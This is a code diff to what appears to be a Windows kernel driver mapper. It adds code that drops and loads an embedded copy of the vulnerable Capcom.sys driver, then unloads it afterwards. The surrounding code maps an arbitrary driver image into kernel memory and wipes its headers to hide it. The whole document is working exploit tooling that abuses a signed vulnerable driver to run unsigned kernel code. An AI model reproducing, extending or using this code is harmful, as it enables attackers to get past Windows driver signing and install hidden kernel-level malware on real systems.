@@ -3,6 +3,8 @@
 #include "util.hpp"
 #include "capcom.hpp"
 #include "structs.hpp"
+#include "loader.hpp"
+#include "capcomsys.hpp"
 #include <cassert>
 
 #pragma comment(lib, "capcom.lib")
@@ -17,6 +19,9 @@ int __stdcall main(const int argc, char** argv)
 		return 0;
 	}
 
+	bool capcomload = loader::load_vuln_driver((uint8_t*)capcom_sys, sizeof(capcom_sys), L"C:\\Windows\\Capcom.sys", L"Capcom");
+	printf("[+] loaded capcom driver: %i\n", capcomload);
+	
 	const auto capcom = std::make_unique<capcom::capcom_driver>();
 
 	const auto _get_module = [&capcom](std::string_view name)
@@ -38,7 +43,7 @@ int __stdcall main(const int argc, char** argv)
 	drvmap::util::open_binary_file(argv[1], driver_image);
 	drvmap::drv_image driver(driver_image);
 
-	const auto kernel_memory = capcom->allocate_pool(driver.size(), kernel::NonPagedPool, true, nullptr);
+	const auto kernel_memory = capcom->allocate_pool(driver.size(), kernel::NonPagedPool, true);
 
 	assert(kernel_memory != 0);
 
@@ -87,12 +92,17 @@ int __stdcall main(const int argc, char** argv)
 			_RtlZeroMemory((void*)kernel_memory, header_size);
 		});
 
-		printf("[+] wiped headers!");
-	} else
+		printf("[+] wiped headers!\n");
+	} 
+	else
 	{
 		printf("[-] creating of driver object failed! 0x%I32X\n", status);
 
 	}
+
+	capcom->close_driver_handle();
+	capcomload = loader::unload_vuln_driver(L"C:\\Windows\\Capcom.sys", L"Capcom");
+	printf("[+] unloaded capcom driver: %i\n", capcomload);
 
 	return 0;
 }
